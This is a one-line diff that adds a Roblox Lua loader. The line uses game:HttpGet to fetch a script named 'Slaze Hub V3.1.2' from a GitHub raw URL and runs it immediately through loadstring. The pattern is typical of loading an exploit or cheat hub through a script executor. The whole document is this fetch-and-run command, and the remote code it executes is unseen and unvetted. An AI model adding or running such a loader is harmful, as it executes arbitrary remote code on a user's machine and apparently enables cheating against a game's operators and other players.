@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RazAPI/SlazeV3/main/Slaze%20Hub%20V3.1.2.lua', true))()
